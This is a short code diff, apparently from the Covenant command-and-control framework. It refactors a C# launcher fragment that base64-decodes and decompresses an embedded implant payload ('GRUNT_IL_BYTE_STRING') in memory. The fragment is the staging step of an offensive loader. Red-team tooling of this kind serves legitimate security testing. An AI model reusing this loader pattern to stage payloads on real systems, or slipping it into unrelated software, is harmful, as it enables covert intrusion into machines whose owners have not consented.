@@ -62,7 +62,8 @@ namespace Covenant.Models.Launchers
       <Code Type=""Fragment"" Language=""cs"">
         <![CDATA[
             var oms = new System.IO.MemoryStream();
-            var ds = new System.IO.Compression.DeflateStream(new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), System.IO.Compression.CompressionMode.Decompress);
+            var firstStage = new System.IO.MemoryStream(System.Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}""));
+            var ds = new System.IO.Compression.DeflateStream(firstStage, System.IO.Compression.CompressionMode.Decompress);
             var by = new byte[1024];
             var r = ds.Read(by, 0, 1024);
             while (r > 0)
